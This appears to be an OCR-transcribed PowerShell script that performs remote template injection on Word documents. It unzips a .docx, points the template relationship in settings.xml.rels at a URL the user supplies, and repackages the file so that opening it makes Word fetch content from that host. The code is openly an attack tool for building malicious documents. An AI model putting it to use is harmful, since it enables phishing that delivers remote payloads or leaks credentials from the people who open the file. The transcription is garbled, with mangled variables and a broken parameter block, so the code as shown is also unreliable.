$ErrorActionPreference = 'SilentlyContinue'
Define function to parse arguments
function Parse-Arguments {
param(
)
[string]$file,
[string] Surl
# Check if file has .docx extension
if ($file -notmatch '.docx') {
Write-Output "Error: File must have .docx extension"
exit
}
# Set input and output file names
$f_in= $file
$index = $file.IndexOf('.docx')
$base = $f_in. Substring(0, $index)
write-output $base
$f_in_zip = $base + ".zip"
$f_out= $base + "new.docx"
$f_out_zip = $base + "new.zip"
# Copy the Word document as a zip and expand it
Copy-Item Sf in $f_in_zip -Force -Pass Thru
Expand-Archive -Path $f_in_zip -DestinationPath $base -Force
# Check if file has preloaded template
Sexists = Test-Path -Path "$base\word\_rels\settings.xml.rels"
if (-not Sexists) {
Write-Output "Error: Use a docx with a preloaded template"
exit
}
# Modify settings.xml.rels
$xm1 = [xm1] (Get-Content "$base \word\_rels\settings.xml.rels")
$xm1.DocumentElement. ChildNodes[0].setattribute('Target', $url)
$xm1. Save ("$base\word\_rels\settings.xml.rels")
# Compress the contents to a new docx
Compress-Archive -Path "$base\s" -DestinationPath $f_out_zip -Force
# Rename new Word document from .zip to .docx
Move-Item $f_out_zip $f_out -Force
Write-Output "URL Injected and saved to $f_out"
# Clean-up
Remove-Item -path $base -recurse -Force
Remove-Item -path $f_in_zip -Force
}
#Define and parse script arguments
Sfile
Sargs [0]
Surl = $args [1]
if(-not $file) {
$file = Read-Host "Please provide .docx file"
}
if(-not Sur1) {
}
$url = Read-Host "Please provide url"
Parse-Arguments -file Sfile -url Surl